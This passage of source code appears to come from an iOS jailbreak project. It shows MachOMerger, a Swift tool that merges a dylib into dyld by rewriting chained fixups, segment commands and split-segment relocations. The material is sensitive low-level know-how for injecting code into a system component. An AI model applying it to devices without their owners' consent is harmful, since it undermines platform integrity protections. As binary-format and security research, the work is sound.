SWIFT_BUILD_ARGS=--triple $(TARGET) --sdk "$(SDK_PATH)" -c $(CONFIG) -Xcc "-DIOS_BUILD" -Xcc -Wno-incompatible-sysroot $(addprefix -Xswiftc ,$(SWIFTC_ARGS))

all: MachOMerger

.PHONY: all build_clean clean

MachOMerger: .build/$(CONFIG)/MachOMerger FORCE
	@cp .build/$(CONFIG)/MachOMerger MachOMerger
	codesign -s - -f $(ENTITLEMENTS_ARG) MachOMerger

.build/$(CONFIG)/%: Sources/% FORCE
	@echo Building MachOMerger
	swift build $(SWIFT_BUILD_ARGS)
	
build_clean:
	rm -rf .build
	
clean: build_clean
	rm -f MachOMerger

FORCE: ;

```

`BaseBin/MachOMerger/Package.resolved`:

```resolved
{
  "pins" : [
    {
      "identity" : "patchfinderutils",
      "kind" : "remoteSourceControl",
      "location" : "https://github.com/pinauten/PatchfinderUtils",
      "state" : {
        "branch" : "master",
        "revision" : "83647509e12001e8f42b2a5dc46b40977e12098b"
      }
    },
    {
      "identity" : "swiftmacho",
      "kind" : "remoteSourceControl",
      "location" : "https://github.com/pinauten/SwiftMachO",
      "state" : {
        "branch" : "master",
        "revision" : "cbfb1886c14bfb28c54034b43e49807ab7c17f11"
      }
    },
    {
      "identity" : "swiftutils",
      "kind" : "remoteSourceControl",
      "location" : "https://github.com/pinauten/SwiftUtils",
      "state" : {
        "branch" : "master",
        "revision" : "1d37faabb4c58b3152394c9b6e1c1a68507646b9"
      }
    }
  ],
  "version" : 2
}

```

`BaseBin/MachOMerger/Package.swift`:

```swift
// swift-tools-version: 5.7
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "MachOMerger",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .executable(
            name: "MachOMerger",
            targets: ["MachOMerger"]),
    ],
    dependencies: [
        // Dependencies declare other packages that this package depends on.
        .package(url: "https://github.com/pinauten/SwiftUtils", branch: "master"),
        .package(url: "https://github.com/pinauten/SwiftMachO", branch: "master"),
        .package(url: "https://github.com/pinauten/PatchfinderUtils", branch: "master")
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .executableTarget(
            name: "MachOMerger",
            dependencies: ["SwiftUtils", "SwiftMachO", "PatchfinderUtils"]),
    ]
)

```

`BaseBin/MachOMerger/README.md`:

```md
# MachOMerger

Merge two MachO binaries into one. The only supported use case at this moment is merging a dylib into dyld.

# Requirements
- The dylib to be injected *must* be compiled with `-Xlinker -add_split_seg_info -Xlinker -no_auth_data`

```

`BaseBin/MachOMerger/Sources/MachOMerger/ChainedFixups.swift`:

```swift
//
//  ChainedFixups.swift
//  MachOMerger
//
//  Created by Linus Henze.
//

import Foundation
import SwiftMachO
import MachO

func mergeChainedFixups(infoA: MachOMergeData, infoB: MachOMergeData, relocInfo: RelocInfo, machOA: MachO, machOB: MachO) -> Data {
    guard let cfA = infoA.chainedFixups else {
        print("No chained fixups! [A]")
        exit(-1)
    }
    
    let versionA = cfA.getGeneric(type: UInt32.self, offset: 0)
    guard versionA == 0 else {
        print("Can only support version 0 chained fixups! [A]")
        exit(-1)
    }
    
    let startsOffA     = cfA.getGeneric(type: UInt32.self, offset: 4)
    //let importsOffA    = cfA.getGeneric(type: UInt32.self, offset: 8)
    //let symsOffA       = cfA.getGeneric(type: UInt32.self, offset: 12)
    let importsCountA  = cfA.getGeneric(type: UInt32.self, offset: 16)
    let importsFormatA = cfA.getGeneric(type: UInt32.self, offset: 20)
    let symsFormatA    = cfA.getGeneric(type: UInt32.self, offset: 24)
    guard symsFormatA == 0 else {
        print("Can only support symbol format 0 for chained fixups!")
        exit(-1)
    }
    
    guard let cfB = infoB.chainedFixups else {
        print("No chained fixups! [B]")
        exit(-1)
    }
    
    let versionB = cfB.getGeneric(type: UInt32.self, offset: 0)
    guard versionB == 0 else {
        print("Can only support version 0 chained fixups! [A]")
        exit(-1)
    }
    
    let startsOffB     = cfB.getGeneric(type: UInt32.self, offset: 4)
    //let importsOffB    = cfB.getGeneric(type: UInt32.self, offset: 8)
    //let symsOffB       = cfB.getGeneric(type: UInt32.self, offset: 12)
    let importsCountB  = cfB.getGeneric(type: UInt32.self, offset: 16)
    let importsFormatB = cfB.getGeneric(type: UInt32.self, offset: 20)
    let symsFormatB    = cfB.getGeneric(type: UInt32.self, offset: 24)
    guard symsFormatB == 0 else {
        print("Can only support symbol format 0 for chained fixups!")
        exit(-1)
    }
    
    guard importsFormatA == importsFormatB else {
        print("Chained fixups imports format must be the same for both binaries!")
        exit(-1)
    }
    
    // For our limited usecase, assume these binaries imports nothing
    /*guard importsCountA == 0 && importsCountB == 0 else {
        print("XXX: Can only support zero imports right now!")
        exit(-1)
    }*/
    
    // If there are any imports, resolve them now
    guard importsCountA == 0 else {
        print("XXX: Can only support zero imports for A right now!")
        exit(-1)
    }
    
    if importsCountB != 0 {
        // Need to walk chain
        let cf = try! b.getChainedFixups()
        let symTable = try! a.getSymbolTable()
        try! cf.forEachFixup({ location, vAddr, content in
            if case .authBind(ordinal: _, diversity: let diversity, addrDiv: let addrDiv, key: let key, next: let next) = content {
                let segment = relocInfo.segment(forOrigAddress: location, isB: true)!
                let off = Int(segment.3)
                var data = segment.1
                let dat = data.getGeneric(type: UInt64.self, offset: UInt(segment.3))
                guard dat == content.rawValue else {
                    print("XXX: ChainedFixups .authBind err!")
                    exit(-1)
                }
                
                guard let sym = cf.symbol(forFixup: content) else {
                    print("Couldn't find symbol in imports table!")
                    exit(-1)
                }
                
                var isB = false
                var dst: UInt64!
                if let d = getMagicSymbolVal(sym) {
                    dst = d.0
                    isB = d.1
                } else if let d = symTable.symbol(forName: sym) {
                    dst = d.value
                }
                
                guard dst != nil else {
                    print("Cannot resolve symbol \(sym)!")
                    exit(-1)
                }
                
                let new = ChainedFixups.ChainedStartsInSegment.ChainTarget.authRebase(target: UInt32(relocInfo.translate(address: dst, isB: isB)), diversity: diversity, addrDiv: addrDiv, key: key, next: next)
                data = data.subdata(in: 0..<off) + Data(fromObject: new.rawValue) + data.subdata(in: (off+8)..<data.count)
                relocInfo.replaceSegment(name: segment.0, isB: true, data: data)
            } else if case .bind(ordinal: _, addend: _, next: let next) = content {
                let segment = relocInfo.segment(forOrigAddress: location, isB: true)!
                let off = Int(segment.3)
                var data = segment.1
                let dat = data.getGeneric(type: UInt64.self, offset: UInt(segment.3))
                guard dat == content.rawValue else {
                    print("XXX: ChainedFixups .bind err!")
                    exit(-1)
                }
                
                let sym = cf.symbol(forFixup: content)!
                
                var isB = false
                var dst: UInt64!
                if let d = getMagicSymbolVal(sym) {
                    dst = d.0
                    isB = d.1
                } else if let d = symTable.symbol(forName: sym) {
                    dst = d.value
                }
                
                guard dst != nil else {
                    print("Cannot resolve symbol \(sym)!")
                    exit(-1)
                }
                
                let new = ChainedFixups.ChainedStartsInSegment.ChainTarget.rebase(target: relocInfo.translate(address: dst, isB: isB), high8: 0, next: next)
                data = data.subdata(in: 0..<off) + Data(fromObject: new.rawValue) + data.subdata(in: (off+8)..<data.count)
                relocInfo.replaceSegment(name: segment.0, isB: true, data: data)
            }
        })
    }
    
    // Okay, we only have to fix the starts
    let startsA = cfA.advanced(by: Int(startsOffA))
    let startsB = cfB.advanced(by: Int(startsOffB))
    
    let segCountA = startsA.getGeneric(type: UInt32.self)
    let segCountB = startsB.getGeneric(type: UInt32.self)
    
    var segsA: [Data?] = []
    var segsB: [Data?] = []
    
    for i in 0..<UInt(segCountA) {
        let off  = Int(startsA.getGeneric(type: UInt32.self, offset: 4 + (4 * i))) + 4
        if off == 4 {
            segsA.append(nil)
            continue
        }
        
        let size = Int(startsA.getGeneric(type: UInt32.self, offset: UInt(off - 4)))
        
        var data = startsA.subdata(in: off..<(off + size))
        
        // Get matching segment
        let seg = relocInfo.segment(forIndex: Int(i), isB: false)
        
        // Change segment offset
        let segmentOff = data.getGeneric(type: UInt64.self, offset: 0x4)
        
        data = data.subdata(in: 0..<4) + Data(fromObject: segmentOff &+ seg.2) + data.subdata(in: 12..<data.count)
        
        segsA.append(data)
    }
    
    for i in 0..<UInt(segCountB) {
        let off = Int(startsB.getGeneric(type: UInt32.self, offset: 4 + (4 * i))) + 4
        if off == 4 {
            segsB.append(nil)
            continue
        }
        
        let size = Int(startsB.getGeneric(type: UInt32.self, offset: UInt(off - 4)))
        
        var data = startsB.subdata(in: off..<(off + size))
        
        // Get matching segment
        let seg = relocInfo.segment(forIndex: Int(i), isB: true)
        
        // Change segment offset
        let segmentOff = data.getGeneric(type: UInt64.self, offset: 0x4)
        
        data = data.subdata(in: 0..<4) + Data(fromObject: segmentOff &+ seg.2) + data.subdata(in: 12..<data.count)
        
        segsB.append(data)
    }
    
    // Now merge them
    var segsMerged: [Data?] = []
    var curA = 0
    var curB = 0
    for seg in relocInfo.segRel {
        if !seg.1[0].isB && seg.1.count == 1 {
            // Only A
            segsMerged.append(segsA[curA])
            curA += 1
        } else if seg.1[0].isB {
            // Only B
            segsMerged.append(segsB[curB])
            curB += 1
        } else {
            // Merge
            if let a = segsA[curA],
               let b = segsB[curB] {
                let offA = a.getGeneric(type: UInt64.self, offset: 0x4)
                let offB = b.getGeneric(type: UInt64.self, offset: 0x4)
                
                let pgSizeA = a.getGeneric(type: UInt16.self, offset: 0x0)
                let pgSizeB = b.getGeneric(type: UInt16.self, offset: 0x0)
                guard pgSizeA == pgSizeB else {
                    print("mergeChainedFixups: Page Size not equal!")
                    exit(-1)
                }
                
                let pageOffMask = UInt64(pgSizeA) - 1
                let diff = offB - offA
                guard diff & pageOffMask == 0 else {
                    print("mergeChainedFixups: Distance not multiple of page size!")
                    exit(-1)
                }
                
                let pageDiff = diff / UInt64(pgSizeA)
                guard pageDiff < UInt16.max else {
                    print("mergeChainedFixups: Distance too large!")
                    exit(-1)
                }
                
                // Emit A with additional pages
                let countA = a.getGeneric(type: UInt16.self, offset: 0x10)
                let countB = b.getGeneric(type: UInt16.self, offset: 0x10)
                var offs = Data()
                for _ in 0..<UInt(pageDiff - UInt64(countA)) {
                    offs += Data(fromObject: UInt16(0xFFFF))
                }
                
                for i in 0..<UInt(countB) {
                    offs += Data(fromObject: b.getGeneric(type: UInt16.self, offset: 0x12 + (2 * i)))
                }
                
                let data = a.subdata(in: 0..<0x10) + Data(fromObject: countA + countB + (UInt16(pageDiff) - countA)) + a.subdata(in: 0x12..<(0x12 + (2 * Int(countA)))) + offs
                segsMerged.append(data)
            } else if segsB[curB] == nil {
                // Effectively only A (maybe)
                segsMerged.append(segsA[curA])
            } else {
                // Effectively only B (maybe)
                segsMerged.append(segsB[curB])
            }
            
            curA += 1
            curB += 1
        }
    }
    
    // Generate the starts header
    var starts  = Data()
    var segData = Data()
    starts.appendGeneric(value: UInt32(segsMerged.count + 1))
    
    let needsAdjust = segsMerged.count & 1 == 1
    let theOff = segsMerged.count + 1 + (needsAdjust ? 1 : 0)
    for i in 0..<segsMerged.count {
        if let s = segsMerged[i] {
            let off = 4 + (4 * theOff) + segData.count
            starts.appendGeneric(value: UInt32(off))
            
            let toAppend = Data(fromObject: UInt32(s.count) + 4) + s
            segData += toAppend
        } else {
            starts.appendGeneric(value: 0 as UInt32)
        }
    }
    
    starts.appendGeneric(value: 0 as UInt32) // LINKEDIT
    
    // Is this needed?
    if needsAdjust {
        starts.appendGeneric(value: 0 as UInt32)
    }
    
    let startsSegData = starts + segData
    
    var newChainedFixups = Data()
    
    // Emit header
    newChainedFixups.appendGeneric(value:  0 as UInt32)                     // ???
    newChainedFixups.appendGeneric(value: 32 as UInt32)                     // startsOff
    newChainedFixups.appendGeneric(value: UInt32(32 + startsSegData.count)) // importsOff
    newChainedFixups.appendGeneric(value: UInt32(32 + startsSegData.count)) // symsOff
    newChainedFixups.appendGeneric(value: 0 as UInt32)                      // importsCount
    newChainedFixups.appendGeneric(value: importsFormatA)                   // importsFormat
    newChainedFixups.appendGeneric(value: symsFormatA)                      // symsFormat
    newChainedFixups.appendGeneric(value: 0 as UInt32)                      // pad
    
    // Emit data
    newChainedFixups.append(startsSegData)
    
    return newChainedFixups
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/MagicSymbols.swift`:

```swift
//
//  MagicSymbols.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-16.
//

import Foundation

func getMagicSymbolVal(_ sym: String) -> (UInt64, Bool)? {
    switch sym {
    case "_MACHOMERGER_REAL_START":
        guard let ths = dataA.unixthread else {
            print("Cannot get real start: A has no unixthread")
            exit(-1)
        }
        
        guard ths.count == 1 else {
            print("More than one UnixThread?!")
            exit(-1)
        }
        
        let th = ths[0]
        guard th.flavor == ARM_THREAD_STATE64 && th.state.count == MemoryLayout<arm_thread_state64_t>.size else {
            print("Can only support ARM64 threads!")
            exit(-1)
        }
        
        let thA64 = th.state.getGeneric(type: arm_thread_state64_t.self)
        return (thA64.__pc, false)
        
    default:
        return nil
    }
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/MiscCmds.swift`:

```swift
//
//  MiscCmds.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-16.
//

import Foundation
import MachO

func emitUUIDCmd() -> (Int, Data) {
    let cmd = uuid_command(cmd: UInt32(LC_UUID), cmdsize: UInt32(MemoryLayout<uuid_command>.size), uuid: UUID().uuid)
    
    return (1, Data(fromObject: cmd))
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/RelocInfo.swift`:

```swift
//
//  RelocInfo.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-15.
//

import Foundation
import SwiftMachO

class RelocInfo {
    public private(set) var segRel: SegRelocInfo
    
    init(segRel: SegRelocInfo) {
        self.segRel = segRel
    }
    
    public func segment(forOrigAddress addr: UInt64, isB: Bool) -> (String, Data, UInt64, UInt64)? {
        for seg in segRel {
            if !isB {
                let s = seg.1[0]
                guard !s.isB else { continue }
                
                let base = s.origCommand.vmAddr
                if addr >= base {
                    if addr < (base + s.origCommand.vmSize) {
                        return (seg.0, s.data, s.offset, addr - base)
                    }
                }
            } else {
                let s = (seg.1.count == 2) ? seg.1[1] : seg.1[0]
                guard s.isB else { continue }
                
                let base = s.origCommand.vmAddr
                if addr >= base {
                    if addr < (base + s.origCommand.vmSize) {
                        return (seg.0, s.data, s.offset, addr - base)
                    }
                }
            }
        }
        
        return nil
    }
    
    public func segment(forName name: String, isB: Bool) -> (Data, UInt64)? {
        for seg in segRel {
            guard seg.0 == name else { continue }
            
            if !isB {
                let s = seg.1[0]
                guard !s.isB else {
                    return nil
                }
                
                return (s.data, s.offset)
            } else {
                let s = (seg.1.count == 2) ? seg.1[1] : seg.1[0]
                guard s.isB else {
                    return nil
                }
                
                return (s.data, s.offset)
            }
        }
        
        return nil
    }
    
    public func segment(forIndex index: Int, isB: Bool) -> (Segment64LoadCommand, Data, UInt64) {
        var currentIndex = 0
        for seg in segRel {
            if !isB {
                let s = seg.1[0]
                guard !s.isB else { continue }
                
                if currentIndex == index {
                    return (s.origCommand, s.data, s.offset)
                }
                
                currentIndex += 1
            } else {
                let s = (seg.1.count == 2) ? seg.1[1] : seg.1[0]
                guard s.isB else { continue }
                
                if currentIndex == index {
                    return (s.origCommand, s.data, s.offset)
                }
                
                currentIndex += 1
            }
        }
        
        print("Invalid segment index \(index)")
        exit(-1)
    }
    
    public func replaceSegment(name: String, isB: Bool, data: Data) {
        for i in 0..<segRel.count {
            guard segRel[i].0 == name else { continue }
            
            if !isB {
                guard !segRel[i].1[0].isB else {
                    print("A does not have segment \(name)")
                    exit(-1)
                }
                
                segRel[i].1[0].data = data
                return
            } else {
                let which = (segRel[i].1.count == 2) ? 1 : 0
                guard segRel[i].1[which].isB else {
                    print("B does not have segment \(name)")
                    exit(-1)
                }
                
                segRel[i].1[which].data = data
                return
            }
        }
        
        print("Bad segment name \(name)")
        exit(-1)
    }
    
    public func section(forIndex: Int, isB: Bool) -> (Data, UInt64, UInt64)? {
        if forIndex == 0 {
            // mach header
            // Should point to the new one
            if !isB {
                return (Data(), segRel[0].1[0].origCommand.vmAddr, 0)
            } else {
                return (Data(), segRel[0].1[1].origCommand.vmAddr, 0)
            }
        }
        
        var currentIndex = 1
        for seg in segRel {
            var s: (isB: Bool, origCommand: Segment64LoadCommand, data: Data, offset: UInt64)!
            if !isB {
                s = seg.1[0]
                guard !s.isB else {
                    continue
                }
            } else {
                s = (seg.1.count == 2) ? seg.1[1] : seg.1[0]
                guard s.isB else {
                    continue
                }
            }
            
            for sect in s!.origCommand.sections {
                if currentIndex == forIndex {
                    // This is what we want
                    let off  = Int(sect.address) - Int(s!.origCommand.vmAddr)
                    let size = Int(sect.size)
                    let data = s!.data.subdata(in: off..<(off + size))
                    
                    return (data, sect.address, sect.address &+ s!.offset)
                }
                
                currentIndex += 1
            }
        }
        
        return nil
    }
    
    public func replaceSection(forIndex: Int, isB: Bool, data: Data) {
        guard forIndex != 0 else {
            print("Cannot replace mach header!")
            exit(-1)
        }
        
        var currentIndex = 1
        for i in 0..<segRel.count {
            var which = 0
            if !isB {
                guard !segRel[i].1[0].isB else {
                    continue
                }
            } else {
                which = (segRel[i].1.count == 2) ? 1 : 0
                guard segRel[i].1[which].isB else {
                    continue
                }
            }
            
            for sect in segRel[i].1[which].origCommand.sections {
                if currentIndex == forIndex {
                    // This is what we want
                    let off  = Int(sect.address) - Int(segRel[i].1[which].origCommand.vmAddr)
                    let size = Int(sect.size)
                    
                    let before = segRel[i].1[which].data.subdata(in: 0..<off)
                    let after  = segRel[i].1[which].data.subdata(in: (off + size)..<segRel[i].1[which].data.count)
                    let data = before + data + after
                    
                    assert(data.count == segRel[i].1[which].data.count)
                    
                    segRel[i].1[which].data = data
                    
                    return
                }
                
                currentIndex += 1
            }
        }
        
        print("Bad section index \(forIndex)")
        exit(-1)
    }
    
    public func translate(address: UInt64, isB: Bool) -> UInt64 {
        address + segment(forOrigAddress: address, isB: isB)!.2
    }
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/SegmentLoadCommand.swift`:

```swift
//
//  SegmentLoadCommand.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-16.
//

import Foundation
import MachO

func generateSegmentLoadCommands(infoA: MachOMergeData, infoB: MachOMergeData, relocInfo: RelocInfo) -> (Int, Data) {
    var result = Data()
    for i in 0..<relocInfo.segRel.count {
        let seg = relocInfo.segRel[i]
        
        // Emit it
        let base = seg.1[0].origCommand.vmAddr &+ seg.1[0].offset
        
        var sects = seg.1[0].origCommand.sections.count
        if seg.1.count > 1 {
            sects += seg.1[1].origCommand.sections.count
        }
        
        var slc = segment_command_64()
        slc.cmd = UInt32(LC_SEGMENT_64)
        slc.cmdsize = UInt32(MemoryLayout<segment_command_64>.size + (MemoryLayout<section_64>.size * sects))
        _ = withUnsafeMutableBytes(of: &slc.segname) { ptr in
            strcpy(ptr.baseAddress!, seg.0)
        }
        
        if i == 0 {
            slc.vmaddr = 0
            if seg.1.count == 1 {
                slc.vmsize = seg.1[0].origCommand.vmSize + 0x4000
                slc.filesize = seg.1[0].origCommand.fileSize + 0x4000
            } else {
                slc.vmsize = seg.1[0].origCommand.vmSize + seg.1[1].origCommand.vmSize + 0x4000
                slc.filesize = seg.1[0].origCommand.fileSize + seg.1[1].origCommand.fileSize + 0x4000
            }
            
            slc.fileoff = 0
            slc.maxprot = VM_PROT_READ | VM_PROT_EXECUTE
            slc.initprot = VM_PROT_READ | VM_PROT_EXECUTE
        } else {
            slc.vmaddr = base
            if seg.1.count == 1 {
                slc.vmsize = seg.1[0].origCommand.vmSize
                slc.filesize = seg.1[0].origCommand.fileSize
            } else {
                slc.vmsize = seg.1[0].origCommand.vmSize + seg.1[1].origCommand.vmSize
                slc.filesize = seg.1[0].origCommand.fileSize + seg.1[1].origCommand.fileSize
            }
            
            slc.fileoff = seg.1[0].origCommand.fileOffset + seg.1[0].offset
            slc.maxprot = Int32(bitPattern: seg.1[0].origCommand.maximumProt.rawValue)
            slc.initprot = Int32(bitPattern: seg.1[0].origCommand.protection.rawValue)
        }
        
        slc.nsects = UInt32(sects)
        slc.flags = seg.1[0].origCommand.flags
        
        var sectsData = Data()
        for sect in seg.1[0].origCommand.sections {
            var sectLC = section_64()
            _ = withUnsafeMutableBytes(of: &sectLC.sectname) { ptr in
                strcpy(ptr.baseAddress!, sect.section)
            }
            _ = withUnsafeMutableBytes(of: &sectLC.segname) { ptr in
                strcpy(ptr.baseAddress!, seg.0)
            }
            
            sectLC.addr = sect.address + seg.1[0].offset
            sectLC.size = sect.size
            sectLC.offset = sect.offset + UInt32(seg.1[0].offset)
            sectLC.align = sect.alignment
            sectLC.flags = sect.flags.rawValue
            sectLC.reserved1 = sect.reserved1
            sectLC.reserved2 = sect.reserved2
            sectLC.reserved3 = sect.reserved3
            
            sectsData.appendGeneric(value: sectLC)
        }
        
        if seg.1.count > 1 {
            for sect in seg.1[1].origCommand.sections {
                var sectLC = section_64()
                _ = withUnsafeMutableBytes(of: &sectLC.sectname) { ptr in
                    if sect.section != "__jbinfo" {
                        // Special case, "__DATA:__jbinfo" section should not be appended with "_2"
                        // Ideally I would have added a check here to only add _2 if the section already exists in file a
                        // But then again this is Swift
                        strcpy(ptr.baseAddress!, sect.section + "_2")
                    }
                    else {
                        strcpy(ptr.baseAddress!, sect.section)
                    }
                }
                _ = withUnsafeMutableBytes(of: &sectLC.segname) { ptr in
                    strcpy(ptr.baseAddress!, seg.0)
                }
                
                sectLC.addr = sect.address + seg.1[1].offset
                sectLC.size = sect.size
                sectLC.offset = sect.offset + UInt32(seg.1[1].offset)
                sectLC.align = sect.alignment
                sectLC.flags = sect.flags.rawValue
                sectLC.reserved1 = sect.reserved1
                sectLC.reserved2 = sect.reserved2
                sectLC.reserved3 = sect.reserved3
                
                sectsData.appendGeneric(value: sectLC)
            }
        }
        
        result.appendGeneric(value: slc)
        result.append(sectsData)
    }
    
    return (relocInfo.segRel.count, result)
}

```

`BaseBin/MachOMerger/Sources/MachOMerger/SegmentSplitInfo.swift`:

```swift
//
//  SegmentSplitInfo.swift
//  MachOMerger
//
//  Created by Linus Henze on 2023-03-15.
//

import Foundation
import PatchfinderUtils
import SwiftMachO
import MachO

func pStr(_ p: UInt64) -> String {
    String(format: "%p", p)
}

func ssiFixAdrp(adrp: UInt32, at: UInt64, to: UInt64) -> UInt32 {
    guard (adrp & 0x9F000000) == 0x90000000 else {
        // Not an adrp - Warn but don't touch
        print("WARNING: ssiFixAdrp: Encountered non-adrp instruction at \(at) - Leaving as-is")
        return adrp
    }
    
    let atPage = (at & ~0xFFF) >> 12
    let toPage = (to & ~0xFFF) >> 12
    let pageDistance = Int64(bitPattern: toPage &- atPage)
    guard pageDistance < 0x200000 && pageDistance > -0x200000 else {
        print("ssiFixAdrp: Cannot fixup adrp: Distance too large!")
        exit(-1)
    }
    
    let instruction = (adrp & 0x9F00001F) | UInt32((pageDistance & 0x1FFFFC) << 3) | UInt32((pageDistance & 0x3) << 29)
    
    guard AArch64Instr.Emulate.adrp(instruction, pc: at) == (to & ~0xFFF) else {
        print("ssiFixAdrp: Generated wrong adrp!")
        exit(-1)
    }
    
    return instruction
}

func ssiFixOff12(instr: UInt32, at: UInt64, to: UInt64, toOld: UInt64) -> UInt32 {
    guard (to & 0xFFF) == (toOld & 0xFFF) else {
        print("ssiFixOff12: Not implemented!")
        exit(-1)
    }
    
    // As long as the lowest 12 bits stay the same, there is nothing to do
    return instr
}

func ssiFixBr26(instr: UInt32, at: UInt64, atOld: UInt64, to: UInt64, toOld: UInt64) -> UInt32 {
    let delta = Int64(bitPattern: to &- at)
    let deltaSh = delta >> 2
    guard deltaSh <= 0x3FFFFFF && deltaSh >= -0x3FFFFFF else {
        print("ssiFixBr26: Delta too large!")
        exit(-1)
    }
    
    let new = (instr & 0xFC000000) | UInt32(deltaSh & 0x03FFFFFF)
    if delta == Int64(bitPattern: toOld &- atOld) {
        guard instr == new else {
            print("ssiFixBr26: Instruction generation bug!")
            exit(-1)
        }
    }
    
    return new
}

func ssiFixImgOff32(val: UInt32, at: UInt64, to: UInt64) -> UInt32 {
    // This should simply point to the new address
    guard to <= UInt32.max else {
        print("ssiFixImgOff32: Cannot fixup: Distance too large!")
        exit(-1)
    }
    
    return UInt32(to)
}

func ssiFixThP64(val: UInt64, at: UInt64, to: UInt64) -> UInt64 {
    let cf = ChainedFixups.ChainedStartsInSegment.ChainTarget(rawValue: val, bindsAre24Bit: false)
    
    switch cf {
    case .authRebase(target: _, diversity: let diversity, addrDiv: let addrDiv, key: let key, next: let next):
        guard to <= UInt32.max else {
            print("ssiFixThP64: Cannot fixup: Distance too large! [authRebase]")
            exit(-1)
        }
        
        return ChainedFixups.ChainedStartsInSegment.ChainTarget.authRebase(target: UInt32(to), diversity: diversity, addrDiv: addrDiv, key: key, next: next).rawValue
        
    case .authBind(ordinal: _, diversity: _, addrDiv: _, key: _, next: _):
        print("ssiFixThP64: authBind shouldn't exist!")
        exit(-1)
        
    case .rebase(target: _, high8: let high8, next: let next):
        guard to <= 0x7FFFFFFFFFF else {
            print("ssiFixThP64: Cannot fixup: Distance too large! [rebase]")
            exit(-1)
        }
        
        return ChainedFixups.ChainedStartsInSegment.ChainTarget.rebase(target: to, high8: high8, next: next).rawValue
        
    case .bind(ordinal: _, addend: _, next: _):
        print("ssiFixThP64: bind shouldn't exist!")
        exit(-1)
    }
}

func processSplitInfo(_ reader: ULEB128Reader, relocInfo: RelocInfo, isB: Bool) {
    let version = reader.read()
    guard version == 0x7F else {
        print("Only DYLD_CACHE_ADJ_V2_FORMAT is supported!")
        exit(-1)
    }
    
    let sectionCount = reader.read()
    for _ in 0..<sectionCount {
        let fromSectionIndex = reader.read()
        let toSectionIndex = reader.read()
        let toOffsetCount = reader.read()
        
        guard fromSectionIndex != 0 else {
            print("Invalid from section index in LC_SEGMENT_SPLIT_INFO - Cannot be zero!")
            exit(-1)
        }
        
        // https://forums.swift.org/t/mixing-var-and-let-in-tuple-destructuring/32459/5
        // Swift, WTF?!
        guard case (var fromSection, let fromSectionOldAddr, let fromSectionNewAddr)? = relocInfo.section(forIndex: Int(fromSectionIndex), isB: isB) else {
            print("Invalid from section index in LC_SEGMENT_SPLIT_INFO!")
            exit(-1)
        }
        
        guard let (_, toSectionOldAddr, toSectionNewAddr) = relocInfo.section(forIndex: Int(toSectionIndex), isB: isB) else {
            print("Invalid to section index in LC_SEGMENT_SPLIT_INFO!")
            exit(-1)
        }
        
        var toSectionOffset: UInt64 = 0
        for _ in 0..<toOffsetCount {
            let toSectionDelta = reader.read()
            let fromOffsetCount = reader.read()
            toSectionOffset += toSectionDelta
            
            for _ in 0..<fromOffsetCount {
                let kind = reader.read()
                
                let fromSectDeltaCount = reader.read()
                var fromSectionOffset: UInt64 = 0
                for _ in 0..<fromSectDeltaCount {
                    let delta = reader.read()
                    fromSectionOffset += delta
                    
                    // We will fix whatever is in fromSection at fromSectionOffset
                    // to point to toSection + toSectionOffset
                    let fromAddr = fromSectionNewAddr + fromSectionOffset
                    let toAddr   = toSectionNewAddr   + toSectionOffset
                    
                    let fromAddrOld = fromSectionOldAddr + fromSectionOffset
                    let toAddrOld   = toSectionOldAddr   + toSectionOffset
                    
                    //print("Fixing up \(pStr(fromAddr)) -> \(pStr(toAddr)) [orig: \(pStr(fromAddrOld)) -> \(pStr(toAddrOld))]")
                    
                    switch kind {
                    case 2:
                        let loc = fromSection.getGeneric(type: UInt32.self, offset: UInt(fromSectionOffset))
                        let new = loc + UInt32(toAddr - toAddrOld)
                        fromSection = fromSection[0..<Int(fromSectionOffset)] + Data(fromObject: new) + fromSection[Int(fromSectionOffset + 4)...]
                        break

                    case 5:
                        let adrp = fromSection.getGeneric(type: UInt32.self, offset: UInt(fromSectionOffset))
                        let new = ssiFixAdrp(adrp: adrp, at: fromAddr, to: toAddr)
                        fromSection = fromSection.subdata(in: 0..<Int(fromSectionOffset)) + Data(fromObject: new) + fromSection.subdata(in: Int(fromSectionOffset + 4)..<fromSection.count)
                        
                    case 6:
                        let instr = fromSection.getGeneric(type: UInt32.self, offset: UInt(fromSectionOffset))
                        let new = ssiFixOff12(instr: instr, at: fromAddr, to: toAddr, toOld: toAddrOld)
                        fromSection = fromSection[0..<Int(fromSectionOffset)] + Data(fromObject: new) + fromSection[Int(fromSectionOffset + 4)...]
                        
                    case 7:
                        let instr = fromSection.getGeneric(type: UInt32.self, offset: UInt(fromSectionOffset))
                        let new = ssiFixBr26(instr: instr, at: fromAddr, atOld: fromAddrOld, to: toAddr, toOld: toAddrOld)
                        fromSection = fromSection[0..<Int(fromSectionOffset)] + Data(fromObject: new) + fromSection[Int(fromSectionOffset + 4)...]
                        
                    case 12:
                        let val = fromSection.getGeneric(type: UInt32.self, offset: UInt(fromSectionOffset))
                        let new = ssiFixImgOff32(val: val, at: fromAddr, to: toAddr)
                        fromSection = fromSection[0..<Int(fromSectionOffset)] + Data(fromObject: new) + fromSection[Int(fromSectionOffset + 4)...]
                        
                    case 13:
                        let val = fromSection.getGeneric(type: UInt64.self, offset: UInt(fromSectionOffset))
                        let new = ssiFixThP64(val: val, at: fromAddr, to: toAddr)
                        fromSection = fromSection[0..<Int(fromSectionOffset)] + Data(fromObject: new) + fromSection[Int(fromSectionOffset + 8)...]
                        
                    default:
                        print("Unknow kind \(kind) in LC_SEGMENT_SPLIT_INFO!")
                        exit(-1)
                    }
                }
            }
        }
        
        // Write updated sections
        relocInfo.replaceSection(forIndex: Int(fromSectionIndex), isB: isB, data: fromSection)
    }
}

func fixupViaSplitInfo(infoA: MachOMergeData, infoB: MachOMergeData, relocInfo: RelocInfo) {
    guard let splitInfoA = infoA.splitInfo else {
